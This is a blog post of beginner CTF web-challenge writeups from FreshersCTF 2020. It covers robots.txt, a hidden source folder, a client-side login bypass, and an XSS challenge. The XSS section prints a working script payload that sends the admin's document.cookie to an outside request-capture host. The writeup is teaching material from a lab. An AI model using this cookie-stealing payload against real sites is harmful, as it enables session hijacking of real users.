---
layout: post
title:  "FreshersCTF 2020 Web Challenges Writeups"
description: Writeup for the challenges in the Web category for the FreshersCTF 2020 ran by ENUSEC. 
date:   2020-12-27 20:27:00 +0000
categories: CTF WebApp
---
# Robots go Beep	

## Problem

We are given a website with a big robot in it and nothing else. Well, the hint is pretty obvious, isn't it?

If this isn't obvious for you because you are barely starting, wikipedia says [robots.txt, is a standard used by websites to communicate with web crawlers and other web robots](https://en.wikipedia.org/wiki/Robots_exclusion_standard) 

![1](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/robots_go_beep_1.png)

## Solution

We only need to check /robots.txt to follow the clue.

![2](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/robots_go_beep_2.png)

Another hint, this time about the sitemap! We know what to do, don't we? [Wiki site about sitemaps](https://en.wikipedia.org/wiki/Site_map)

![3](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/robots_go_beep_3.png)

# Saucy

## Problem

We are given a website containing a yummy tomato sauce picture. I personally went mad overcomplicating this one trying to steganography the hell out of the picture without any result.

## Solution

Then I realised `saucy` was a hint towards `source` (code), so I double-checked and there it was:

![1](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/saucy1.png)

That easy, just go to that folder. Note to future-self: try and get the low hanging fruit first, you *dummy*!

![2](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/saucy2.png)

# Not Java

## Problem

```
Ooops.

Looks like the developers of this Authentication system left a huge gigantic gaping hole in the application.

Can you exploit their incompetence?
```

We are presented a dull login page. 

Exactly as it happened to me with Saucy, happened to me with "Not Java". 

I realised the solution at the time the CTF was about to finish. I guess some pressure helps me thinking!

## Solution

If we stop trying to bruteforce the login form for a minute and check the script running in the page, we find it's calling a function to log us in. That function is checking parameters and then calling another function: `logIn("")`. The only thing we need to do is calling it in the devtools console and we'll get the door wide open!.

![1](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/not_java_1.png)

![2](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/not_java_2.png)

We get redirected to our flag straight away:

![3](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/not_java_3.png)

# KFF

## Problem

```
This encoding application seems to have a massive oversight.

Can you exploit it and steal the Admins session?
```

We get a big lock image with two prompts that encode a message, one for viewing ourselves our encoded message and another one to send the encryped message to the admin. 
Smells like [XSS](https://owasp.org/www-community/attacks/xss/), doesn't it?

## Solution

Let's try to encode some messages. If we say `hello`, we receive `ifmmp`. It looks like we have a [ROT13](https://en.wikipedia.org/wiki/ROT13) variant cipher instead of an encoding, right?. 

![1](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/kff_1.png)  

However, if we try with symbols, they also rotate, therefore we are talking about a variant of [ROT47](https://en.wikipedia.org/wiki/ROT13#Variants) encryption with a rotation we don't know yet.

![2](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/kff_2.png)

We can use [Cyberchef](https://gchq.github.io/CyberChef/)'s ROT47 tool to play around with the ciphertext until we decrypt it:

![3](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/kff_6.png)

We find the ciphertext being decrypted as ROT1 but what we actually need is the oposite to correctly encrypt our payload:

![4](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/kff_7.png)

We finally discover the encryption is ROT-1 (ROT47(-48)). Let's try then to get some XSS working!

![5](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/kff_4.png)

... And we were right!!!

Now that we finally have our PoC working, we need to send the payload to the admin in order to steal their session cookie. We can do this with the following payload, where `document.location=<our website>?cookie=` is the listening server we control with a cookie request URL encoded and `document.cookie` is the cookie we want to steal from the admin:  

```
<script>document.location="https://enx0ouxtov1d1z8.m.pipedream.net?cookie="+document.cookie;</script>
```
![6](https://raw.githubusercontent.com/0x5ubt13/Write-Ups/master/FreshersCTF2020%40ENUSEC/images/kff_5.png)

`Author: @0x5ubt13`
